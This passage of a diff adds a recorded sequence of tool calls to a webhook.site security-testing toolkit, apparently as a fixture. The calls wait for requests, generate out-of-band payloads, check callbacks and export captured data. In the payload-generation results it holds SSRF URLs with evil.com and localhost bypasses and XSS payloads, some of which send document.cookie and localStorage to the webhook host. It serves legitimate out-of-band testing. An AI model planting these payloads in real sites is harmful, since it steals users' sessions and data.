+    "action_id": "30a7735d-d063-4d0d-9c37-5382f88e6e01"
+   },
+   "result": {
+    "success": true,
+    "message": "Custom action deleted",
+    "action_id": "30a7735d-d063-4d0d-9c37-5382f88e6e01",
+    "status_code": 200
+   }
+  },
+  {
+   "seq": 40,
+   "tool": "wait_for_request",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "timeout_seconds": 30,
+    "request_type": "web"
+   },
+   "result": {
+    "success": true,
+    "message": "Request received (type: web)",
+    "request": {
+     "uuid": "d9b33133-3ea3-4355-8179-853ea7d8114c",
+     "type": "web",
+     "method": "POST",
+     "content": "{\"ping\":1788466366.25647}",
+     "text_content": null,
+     "headers": {
+      "content-length": [
+       "25"
+      ],
+      "api-key": [
+       "00000000-0000-4000-8000-0000000000ee"
+      ],
+      "content-type": [
+       "application/json"
+      ],
+      "accept": [
+       "application/json"
+      ],
+      "user-agent": [
+       "python-httpx/0.28.1"
+      ],
+      "accept-encoding": [
+       "gzip, deflate, br"
+      ],
+      "host": [
+       "webhook.site"
+      ]
+     },
+     "query": null,
+     "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+     "ip": "203.0.113.10",
+     "created_at": "2026-09-03 20:12:47"
+    },
+    "waited": true,
+    "source": "socket"
+   }
+  },
+  {
+   "seq": 41,
+   "tool": "send_requests",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "data": {
+     "ping": 1788466366.25647
+    }
+   },
+   "result": {
+    "success": true,
+    "message": "Sent 1/1 requests successfully",
+    "total": 1,
+    "success_count": 1,
+    "fail_count": 0,
+    "results": [
+     {
+      "index": 0,
+      "success": true,
+      "status_code": 200
+     }
+    ]
+   }
+  },
+  {
+   "seq": 42,
+   "tool": "generate_oob_payloads",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "kind": "ssrf",
+    "identifier": "lc-ssrf"
+   },
+   "result": {
+    "success": true,
+    "message": "Generated 12 SSRF payloads",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "identifier": "lc-ssrf",
+    "callback_payloads": {
+     "http_url": "http://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf",
+     "https_url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf",
+     "subdomain_url": "https://5f00600b-6562-4360-beb8-f83ea0c69260.webhook.site?id=lc-ssrf",
+     "at_bypass": "https://evil.com@webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+     "hash_bypass": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260#@evil.com",
+     "redirect_chain": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?redirect=true",
+     "dns_payload": "lc-ssrf.5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+     "dns_with_data": "ssrf.lc-ssrf.5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+     "url_encoded": "https%3A//webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260%3Fid%3Dlc-ssrf",
+     "double_encoded": "https%253A//webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260"
+    },
+    "local_bypass_examples": {
+     "localhost_bypass": "http://127.0.0.1.nip.io/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf",
+     "decimal_ip": "http://2130706433/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf"
+    },
+    "usage_tips": [
+     "callback_payloads hit webhook.site or dnshook.site and can be confirmed with check_for_callbacks.",
+     "local_bypass_examples target localhost and will not appear as webhook.site callbacks.",
+     "DNS payloads can detect SSRF even when the HTTP response is blocked.",
+     "The identifier helps track which injection point worked."
+    ]
+   }
+  },
+  {
+   "seq": 43,
+   "tool": "generate_oob_payloads",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "kind": "xss",
+    "identifier": "lc-xss"
+   },
+   "result": {
+    "success": true,
+    "message": "Generated 11 XSS payloads",
+    "token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "identifier": "lc-xss",
+    "payloads": {
+     "basic_img": "<img src=\"https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?xss=1&id=lc-xss\">",
+     "basic_script": "<script>fetch(\"https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?xss=1&id=lc-xss\")</script>",
+     "cookie_steal": "<script>fetch(\"https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?c=\"+document.cookie)</script>",
+     "cookie_img": "<img src=x onerror=\"this.src='https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?c='+document.cookie\">",
+     "dom_info": "<script>fetch(\"https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?url=\"+encodeURIComponent(location.href)+\"&ref=\"+encodeURIComponent(document.referrer)&id=lc-xss)</script>",
+     "full_capture": "<script>fetch(\"https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260\",{method:\"POST\",body:JSON.stringify({url:location.href,cookies:document.cookie,localStorage:JSON.stringify(localStorage)})})</script>",
+     "onerror": "<img src=x onerror=\"fetch('https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?xss=onerror&id=lc-xss')\">",
+     "onload": "<body onload=\"fetch('https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?xss=onload&id=lc-xss')\">",
+     "svg": "<svg onload=\"fetch('https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?xss=svg&id=lc-xss')\">",
+     "base64": "<script>eval(atob(\"ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzVmMDA2MDBiLTY1NjItNDM2MC1iZWI4LWY4M2VhMGM2OTI2MD94c3M9YjY0JmlkPWxjLXhzcycp\"))</script>",
+     "unicode": "\\u003cscript\\u003efetch(\\u0022https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?xss=uni&id=lc-xss\\u0022)\\u003c/script\\u003e"
+    },
+    "usage_tips": [
+     "Try each payload in input fields, URL params, headers",
+     "Cookie stealing payloads may be blocked by HttpOnly flag",
+     "Use check_for_callbacks to see if XSS was triggered",
+     "SVG and onerror variants bypass some filters"
+    ]
+   }
+  },
+  {
+   "seq": 44,
+   "tool": "generate_oob_payloads",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "kind": "canary",
+    "canary_type": "dns"
+   },
+   "result": {
+    "success": true,
+    "message": "Generated dns canary token",
+    "type": "dns",
+    "identifier": null,
+    "canary": {
+     "token": "canary.5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site",
+     "nslookup_command": "nslookup canary.5f00600b-6562-4360-beb8-f83ea0c69260.dnshook.site"
+    },
+    "instructions": [
+     "Any DNS lookup to this domain will be captured",
+     "Useful for detecting data exfiltration attempts",
+     "Embed in hostnames, SSRF payloads, or config files"
+    ],
+    "check_command": "Use check_for_callbacks to see if triggered"
+   }
+  },
+  {
+   "seq": 45,
+   "tool": "check_for_callbacks",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "since_minutes": 5,
+    "identifier": "lc-ssrf"
+   },
+   "result": {
+    "success": true,
+    "message": "CALLBACKS DETECTED! (1 requests in last 5 min)",
+    "detected": true,
+    "total_callbacks": 1,
+    "by_type": {
+     "web": 1,
+     "dns": 0,
+     "email": 0
+    },
+    "since_minutes": 5,
+    "identifier_filter": "lc-ssrf",
+    "callbacks": [
+     {
+      "type": "web",
+      "method": "GET",
+      "ip": "203.0.113.10",
+      "user_agent": [
+       "python-httpx/0.28.1"
+      ],
+      "timestamp": "2026-09-03 20:12:49",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf",
+      "matched_identifier": true
+     }
+    ]
+   }
+  },
+  {
+   "seq": 46,
+   "tool": "export_webhook_data",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "limit": 200
+   },
+   "result": {
+    "success": true,
+    "message": "Exported 9 requests",
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "export_format": "json",
+    "request_count": 9,
+    "requests": [
+     {
+      "uuid": "8e171d6f-4492-48ef-9df3-7441a42eb97f",
+      "type": "web",
+      "method": "GET",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "accept": [
+        "*/*"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": {
+       "id": "lc-ssrf"
+      },
+      "content": "",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:49",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "d9b33133-3ea3-4355-8179-853ea7d8114c",
+      "type": "web",
+      "method": "POST",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-length": [
+        "25"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "{\"ping\":1788466366.25647}",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:47",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "54177230-e709-4118-a211-0631aa8b3160",
+      "type": "email",
+      "method": null,
+      "url": null,
+      "ip": null,
+      "hostname": "eu-west-1.amazonses.com",
+      "headers": {
+       "authentication-results": [
+        "amazonses.com; spf=pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com; dkim=pass header.i=@emailhook.site; dkim=pass header.i=@amazonses.com; dmarc=pass header.from=emailhook.site;"
+       ],
+       "content-transfer-encoding": [
+        "quoted-printable"
+       ],
+       "content-type": [
+        "text/html; charset=utf-8"
+       ],
+       "date": [
+        "Thu, 3 Sep 2026 20:12:43 +0000"
+       ],
+       "dkim-signature": [
+        "v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple; s=cjdhvmdcmiih46loqwoomwteu2wy4pno; d=emailhook.site; t=1788466363; h=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding; bh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=; b=wQ91T+/VhEdo3kKnGPbSauJWkoj+Ro/PwxxA4j5XVv+8VVzUcyvre4ohwHB4NfecZvNIratYeWPpr1lekPfx9+c/u2HXvmXUSb93EAY/4ihU8qlqL3tS4OK5hxhxkei/5gnhppJSSA8eBgfnJqjkDeij/y7d60S8/YFIjcEzn0qa5n5VC5+WZDFyYbQR4VDfaQlFs5RL6npNITnWl+/xt8NHIjcU5sRsLRAxBOh1Z5EXU45OhIdZSnlxmXPbwD+X5PXGoUoNUfIVf7i+3I0Q2eoJNHSrIByZw1nhnglcNd3PaDInHxhH6brcT22d00buUxjHU99R9i4Wzl/g6abH5w==",
+        "v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple; s=shh3fegwg5fppqsuzphvschd53n6ihuv; d=amazonses.com; t=1788466363; h=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding:Feedback-ID; bh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=; b=ch7BpBhVxW3WrCvN+PFQjnAqshQSjMbntGvRWgwFKV7sLxlO5ahvT8KNfSLSfo2uoPkYUHo/CP+2cb8KgJuLMrkCYE3vXyS+h5XZR+9euBw38tF28L1uyhaegisuLZCJ8gK8QiMCx+0cXthnXew+hAg/uQF7COnPTZiQZX80eI4="
+       ],
+       "feedback-id": [
+        "::1.eu-west-1.nx7zeRFyVP5Qdmq34yGyufZlEfVO/BgPkRJenQeP4q4=:AmazonSES"
+       ],
+       "from": [
+        "\"Webhook.site\" <5f00600b-6562-4360-beb8-f83ea0c69260@emailhook.site>"
+       ],
+       "message-id": [
+        "<user@example.com>"
+       ],
+       "mime-version": [
+        "1.0"
+       ],
+       "received": [
+        "from a7-19.smtp-out.eu-west-1.amazonses.com (a7-19.smtp-out.eu-west-1.amazonses.com [203.0.113.10]) by inbound-smtp.eu-west-1.amazonaws.com with SMTP id v144u720p0bb6hb1h7ee2hn72nq6h3t29suap4g1 for 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site; Thu, 03 Sep 2026 20:12:43 +0000 (UTC)"
+       ],
+       "received-spf": [
+        "pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com;"
+       ],
+       "return-path": [
+        "<user@example.com>"
+       ],
+       "subject": [
+        "Verify your account"
+       ],
+       "to": [
+        "5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site"
+       ]
+      },
+      "query": {},
+      "content": "Return-Path: <user@example.com>\r\nReceived: from a7-19.smtp-out.eu-west-1.amazonses.com (a7-19.smtp-out.eu-west-1.amazonses.com [203.0.113.10])\r\n by inbound-smtp.eu-west-1.amazonaws.com with SMTP id v144u720p0bb6hb1h7ee2hn72nq6h3t29suap4g1\r\n for 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site;\r\n Thu, 03 Sep 2026 20:12:43 +0000 (UTC)\r\nX-SES-Spam-Verdict: FAIL\r\nX-SES-Virus-Verdict: PASS\r\nReceived-SPF: pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com;\r\nAuthentication-Results: amazonses.com;\r\n spf=pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com;\r\n dkim=pass header.i=@emailhook.site;\r\n dkim=pass header.i=@amazonses.com;\r\n dmarc=pass header.from=emailhook.site;\r\nX-SES-RECEIPT: AEFBQUFBQUFBQUFIZlhxOEpCQ2t3dUNxZlYxcVVGdnEyakdCYUpON3NFMWVXdGZJb3ZDT245S2pZci9DREcyb1J3bUt0L0pIYU9kRGdKM0hjb2VpcWd0NHpCa3BwVVBOR29PRldaaTZhbEpjbk9UWUc2eE9Rdm5UUUVybkdCWUlNZUxHaW9zNkUzWXFielBPWGlVSFJHWGgzQ3NJYTd2Z1dFakNkZDM3cXNzSExoem1TelJoVzljRW9ZbksrcjVYSnVPZmpGdGhqbkxORml5K2xqb0lyYWozbWphbTZjVjNKc2dpUGFYZVRHV254UkNDNlU2ZlVZSE9ON1hYSmdiMGhRdmxyUjJScGYyb1VERW9PbkMyR2dqZ0ZLZS9RdFhDbGNjNkZCOFVIV3BJa2ZTOUhhWEcrSHBCaEhudWpidTlwQlVmSU1yYVpPY0xhM1RzUWxFZVgvT3ZKZ0ZVVWh2WkQxT1NhUmsvSWxhektMd1A2ZjJaeDRnY3N1ZUhhWldOeVBneDU3b1ppcnY4PQ==\r\nX-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=ItIQ6P5ZaZWcX54Ux3Z7q86JYGg0oGuNwQfDcpKkr7ZoXt+Bclby6gESQ4cxQ9UFGO6HXSvaUN+uiq/VahAtz7dSZtID2rvy8pkExUK3GhruZR4UTRCx2WFGGqiRuV9/jwQHvvuuiywDGsyTehNN84iR+5PjBEX2IwX8d0R4qZ4=; c=relaxed/simple; s=shh3fegwg5fppqsuzphvschd53n6ihuv; d=amazonses.com; t=1788466363; v=1; bh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;\r\nDKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;\r\n\ts=cjdhvmdcmiih46loqwoomwteu2wy4pno; d=emailhook.site; t=1788466363;\r\n\th=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding;\r\n\tbh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=;\r\n\tb=wQ91T+/VhEdo3kKnGPbSauJWkoj+Ro/PwxxA4j5XVv+8VVzUcyvre4ohwHB4Nfec\r\n\tZvNIratYeWPpr1lekPfx9+c/u2HXvmXUSb93EAY/4ihU8qlqL3tS4OK5hxhxkei/5gn\r\n\thppJSSA8eBgfnJqjkDeij/y7d60S8/YFIjcEzn0qa5n5VC5+WZDFyYbQR4VDfaQlFs5\r\n\tRL6npNITnWl+/xt8NHIjcU5sRsLRAxBOh1Z5EXU45OhIdZSnlxmXPbwD+X5PXGoUoNU\r\n\tfIVf7i+3I0Q2eoJNHSrIByZw1nhnglcNd3PaDInHxhH6brcT22d00buUxjHU99R9i4W\r\n\tzl/g6abH5w==\r\nDKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;\r\n\ts=shh3fegwg5fppqsuzphvschd53n6ihuv; d=amazonses.com; t=1788466363;\r\n\th=To:Subject:From:Message-ID:MIME-Version:Date:Content-Type:Content-Transfer-Encoding:Feedback-ID;\r\n\tbh=7/NiP76jPlghj0cj/dyOQrjH9rTLB95RlsM6SG+lDmM=;\r\n\tb=ch7BpBhVxW3WrCvN+PFQjnAqshQSjMbntGvRWgwFKV7sLxlO5ahvT8KNfSLSfo2u\r\n\toPkYUHo/CP+2cb8KgJuLMrkCYE3vXyS+h5XZR+9euBw38tF28L1uyhaegisuLZCJ8gK\r\n\t8QiMCx+0cXthnXew+hAg/uQF7COnPTZiQZX80eI4=\r\nTo: 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site\r\nSubject: Verify your account\r\nFrom: \"Webhook.site\" <5f00600b-6562-4360-beb8-f83ea0c69260@emailhook.site>\r\nMessage-ID: <user@example.com>\r\nMIME-Version: 1.0\r\nDate: Thu, 3 Sep 2026 20:12:43 +0000\r\nContent-Type: text/html; charset=utf-8\r\nContent-Transfer-Encoding: quoted-printable\r\nFeedback-ID: ::1.eu-west-1.nx7zeRFyVP5Qdmq34yGyufZlEfVO/BgPkRJenQeP4q4=:AmazonSES\r\nX-SES-Outgoing: 2026.09.03-203.0.113.10\r\n\r\n<p>Your verification code is 847291.</p><p><a href=3D\"https://example.com/v=\r\nerify?token=3Dabc&amp;u=3D1\">Verify your email</a></p>\r\n",
+      "text_content": "Your verification code is 847291.\n\n[Verify your email](https://example.com/verify?token=abc&u=1)",
+      "html_content": "<p>Your verification code is 847291.</p><p><a href=\"https://example.com/verify?token=abc&amp;u=1\">Verify your email</a></p>\r\n",
+      "sender": "user@example.com",
+      "checks": {
+       "spam": false,
+       "virus": true,
+       "spf": true,
+       "dkim": true,
+       "dmarc": true
+      },
+      "files": [],
+      "created_at": "2026-09-03 20:12:44",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "c6be920f-b425-43e6-a631-3e2b121a99ad",
+      "type": "web",
+      "method": "POST",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-length": [
+        "18"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "{\"trigger\":\"mail\"}",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:43",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "64fa9234-566f-4736-8341-e33e3751e8f9",
+      "type": "web",
+      "method": "POST",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-type": [
+        "application/json"
+       ],
+       "content-length": [
+        "16"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "accept": [
+        "*/*"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "{\"dynamic\":true}",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:39",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "80e4fca4-9248-48eb-be19-fbfe0d4c749f",
+      "type": "web",
+      "method": "POST",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-type": [
+        "multipart/form-data; boundary=a9883211097c1eb771a8a5867a434a6f"
+       ],
+       "content-length": [
+        "190"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "accept": [
+        "*/*"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": {
+       "report": {
+        "id": "436a929c-6736-4ad8-84a8-6a15b6a1b24c",
+        "name": "report",
+        "filename": "report.txt",
+        "size": 16,
+        "content_type": "text/plain",
+        "content": "hello attachment"
+       }
+      },
+      "created_at": "2026-09-03 20:12:35",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "1e044a60-4851-4e8c-81b5-a92a574d9f54",
+      "type": "web",
+      "method": "PUT",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-length": [
+        "7"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "{\"n\":2}",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:34",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "ef31a894-d678-4f2f-ba2e-7e22fd8d4f38",
+      "type": "web",
+      "method": "PUT",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-length": [
+        "7"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "{\"n\":1}",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:34",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     },
+     {
+      "uuid": "99cbe53f-e41b-4f39-9aa0-bd94d1535aa4",
+      "type": "web",
+      "method": "POST",
+      "url": "https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260",
+      "ip": "203.0.113.10",
+      "hostname": "webhook.site",
+      "headers": {
+       "content-length": [
+        "65"
+       ],
+       "x-check": [
+        "1"
+       ],
+       "api-key": [
+        "00000000-0000-4000-8000-0000000000ee"
+       ],
+       "content-type": [
+        "application/json"
+       ],
+       "accept": [
+        "application/json"
+       ],
+       "user-agent": [
+        "python-httpx/0.28.1"
+       ],
+       "accept-encoding": [
+        "gzip, deflate, br"
+       ],
+       "host": [
+        "webhook.site"
+       ]
+      },
+      "query": null,
+      "content": "{\"event\":\"one\",\"link\":\"https://example.com/verify?token=abc&u=1\"}",
+      "text_content": null,
+      "html_content": null,
+      "sender": null,
+      "checks": null,
+      "files": [],
+      "created_at": "2026-09-03 20:12:34",
+      "user_agent": "Unknown",
+      "content_type": "Unknown"
+     }
+    ],
+    "pagination": {
+     "total": 9,
+     "per_page": 100,
+     "current_page": 1,
+     "last_page": null,
+     "is_last_page": true,
+     "pages_fetched": 1,
+     "returned": 9,
+     "truncated": false
+    }
+   }
+  },
+  {
+   "seq": 47,
+   "tool": "export_webhook_data",
+   "args": {
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "format": "csv"
+   },
+   "result": {
+    "success": true,
+    "message": "Exported 57 requests as CSV",
+    "webhook_token": "5f00600b-6562-4360-beb8-f83ea0c69260",
+    "export_format": "csv",
+    "request_count": 57,
+    "truncated": false,
+    "csv": "uuid,type,team_id,ip,country,country_code,region,city,hostname,protocol,method,user_agent,content,url,size,created_at,custom_action_errors,time,request.header.content-length,request.header.x-check,request.header.api-key,request.header.content-type,request.header.accept,request.header.user-agent,request.header.accept-encoding,request.header.host,note,custom_action_output.796c5dd3-9d79-4dd0-8d9c-f9e36d779d69,custom_action_output.c929a7b6-a1c7-4bd2-ade5-ad1145bb9230,custom_action_output.30a7735d-d063-4d0d-9c37-5382f88e6e01,sender,message_id,text_content,html_content,email_truncated,request.header.authentication-results,request.header.content-transfer-encoding,request.header.date,request.header.dkim-signature,request.header.feedback-id,request.header.from,request.header.message-id,request.header.mime-version,request.header.received,request.header.received-spf,request.header.return-path,request.header.subject,request.header.to,request.query.id\n8e171d6f-4492-48ef-9df3-7441a42eb97f,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,GET,python-httpx/0.28.1,,https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260?id=lc-ssrf,0,\"2026-09-03 20:12:49\",Array,0.0015511512756348,,,,,*/*,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,\"Condition \"\"web\"\" is not equal to \"\"web\"\" evaluated to NO: Execution continued.\",\"updated GET\",,,,,,,,,,,,,,,,,,,,lc-ssrf\nd9b33133-3ea3-4355-8179-853ea7d8114c,web,64829,203.0.113.10,Norway,NO,Viken,Nesoddtangen,webhook.site,http/1.1,POST,python-httpx/0.28.1,\"{\"\"ping\"\":1788466366.25647}\",https://webhook.site/5f00600b-6562-4360-beb8-f83ea0c69260,25,\"2026-09-03 20:12:47\",Array,0.0081567764282227,25,,00000000-0000-4000-8000-0000000000ee,application/json,application/json,python-httpx/0.28.1,\"gzip, deflate, br\",webhook.site,,\"Condition \"\"web\"\" is not equal to \"\"web\"\" evaluated to NO: Execution continued.\",\"updated POST\",,,,,,,,,,,,,,,,,,,,\n54177230-e709-4118-a211-0631aa8b3160,email,64829,,,,,,eu-west-1.amazonses.com,,,,\"Return-Path: <user@example.com>\r\nReceived: from a7-19.smtp-out.eu-west-1.amazonses.com (a7-19.smtp-out.eu-west-1.amazonses.com [203.0.113.10])\r\n by inbound-smtp.eu-west-1.amazonaws.com with SMTP id v144u720p0bb6hb1h7ee2hn72nq6h3t29suap4g1\r\n for 5f00600b-6562-4360-beb8-f83ea0c69260@email.webhook.site;\r\n Thu, 03 Sep 2026 20:12:43 +0000 (UTC)\r\nX-SES-Spam-Verdict: FAIL\r\nX-SES-Virus-Verdict: PASS\r\nReceived-SPF: pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com;\r\nAuthentication-Results: amazonses.com;\r\n spf=pass (spfCheck: domain of eu-west-1.amazonses.com designates 203.0.113.10 as permitted sender) client-ip=203.0.113.10; envelope-from=user@example.com; helo=a7-19.smtp-out.eu-west-1.amazonses.com;\r\n dkim=pass header.i=@emailhook.site;\r\n dkim=pass header.i=@amazonses.com;\r\n dmarc=pass header.from=emailhook.site;\r\nX-SES-RECEIPT: 